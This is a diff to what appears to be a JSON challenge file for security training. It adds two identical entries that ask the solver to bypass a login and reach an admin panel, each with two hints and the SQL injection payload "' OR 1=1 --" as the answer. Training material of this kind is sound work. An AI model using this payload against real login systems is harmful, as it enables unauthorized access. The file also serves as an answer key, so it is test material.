@@ -62,6 +62,39 @@
                 "description": "Final exploit payload to bypass login.",
                 "value": "' OR 1=1 --"
               }
+            },
+            {
+              "challengeText": "Bypass the authentication mechanism and gain access to the admin panel.",
+              "hints": [
+                {
+                  "order": 1,
+                  "text": "Look at how the username is validated."
+                },
+                {
+                  "order": 2,
+                  "text": "Check what happens when authentication fails."
+                }
+              ],
+              "payload": {
+                "description": "Final exploit payload to bypass login.",
+                "value": "' OR 1=1 --"
+              }
+            },{
+              "challengeText": "Bypass the authentication mechanism and gain access to the admin panel.",
+              "hints": [
+                {
+                  "order": 1,
+                  "text": "Look at how the username is validated."
+                },
+                {
+                  "order": 2,
+                  "text": "Check what happens when authentication fails."
+                }
+              ],
+              "payload": {
+                "description": "Final exploit payload to bypass login.",
+                "value": "' OR 1=1 --"
+              }
             }
           ]
         },
